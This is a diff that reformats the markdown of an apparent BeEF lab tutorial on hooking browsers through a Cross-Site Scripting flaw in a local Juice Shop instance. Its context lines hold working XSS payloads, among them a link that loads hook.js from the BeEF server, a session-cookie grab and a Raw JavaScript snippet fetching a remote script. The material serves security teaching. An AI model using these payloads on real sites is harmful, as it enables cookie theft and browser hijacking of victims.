@@ -2,8 +2,8 @@
 
 This tutorial assumes you followed the [installation instructions](README.md)
 and that the BeEF application is up and running, and can be reached at
-[http://beef.local:3000](http://beef.local:3000), and that Juice Shop is up and running,
-and can be reached at
+[http://beef.local:3000](http://beef.local:3000), and that Juice Shop is up and
+running, and can be reached at
 [http://vulnerable.local:3500](http://vulnerable.local:3500).
 
 Let's see what you can do with BeEF: This tutorial will show you, as an
@@ -24,14 +24,14 @@ starting up, this will be empty.
 ## Victim's point of view
 
 For the victim's point of view, open a _new browser window_. Let's now surf to a
-vulnerable site which contains a Cross-Site Scripting vulnerability.
-Go to [http://vulnerable.local:3500](http://vulnerable.local:3500) and click on
-the search icon in the top right. This will open up a search box. Search for
+vulnerable site which contains a Cross-Site Scripting vulnerability. Go to
+[http://vulnerable.local:3500](http://vulnerable.local:3500) and click on the
+search icon in the top right. This will open up a search box. Search for
 "banana". This will return all results having "banana" in their description.
 
 Now, an attacker discovered that the site contains a Cross-Site Scripting
 vulnerability. Search for the term [<img src=a
-onerror=alert(1)>](http://vulnerable.local:3500/#/search?q=%3Cimg%20src%3Da%20onerror%3Dalert(1)%3E).
+onerror=alert(1)>](<http://vulnerable.local:3500/#/search?q=%3Cimg%20src%3Da%20onerror%3Dalert(1)%3E>).
 
 This will execute a reflected Cross-Site Scripting payload - an alert box will
 pop up, showing a 1.
@@ -46,7 +46,7 @@ victims to click on that link, for example by social engineering, using link
 shorteners and messaging the link.
 
 Click on the following link, prepared by the attacker:
-[http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple](http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple)
+[http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple](<http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple>)
 
 Nothing weird happens, right? You don't see results, but that's all. Say now
 that the victim wants to log on to the site, and clicks on the account link top
@@ -83,7 +83,7 @@ that the user entered.
 ### Grabbing the session cookie
 
 Select the _Commands_ tab. This is where the majority of actions will be
-performed. In the Module Tree, search for _cookie_. Select *Get Cookie*. Now, in
+performed. In the Module Tree, search for _cookie_. Select _Get Cookie_. Now, in
 the rightmost side of the screen you can click on _Execute_. This will execute
 the selected command.
 
@@ -129,11 +129,11 @@ demonstrate how easy it is to trick victims.
 
 ### Fun and games
 
-Just for fun, play a sound on the victim's computer. Search for *sound* and
-execute the *Play Sound* module.
+Just for fun, play a sound on the victim's computer. Search for _sound_ and
+execute the _Play Sound_ module.
 
-Is the sound on? Then we can do better... Search for *raw* and select the *Raw
-JavaScript* module. Paste the following code in the JavaScript Code window:
+Is the sound on? Then we can do better... Search for _raw_ and select the _Raw
+JavaScript_ module. Paste the following code in the JavaScript Code window:
 
 ```
 var b = document.createElement('script');
@@ -141,7 +141,8 @@ b.type = 'text/javascript';
 b.src = 'http://extract.pw/shake.js';
 document.body.appendChild(b);
 ```
-Click on *Execute*.
+
+Click on _Execute_.
 
 **The attacker successfully executed arbitrary JavaScript**
 
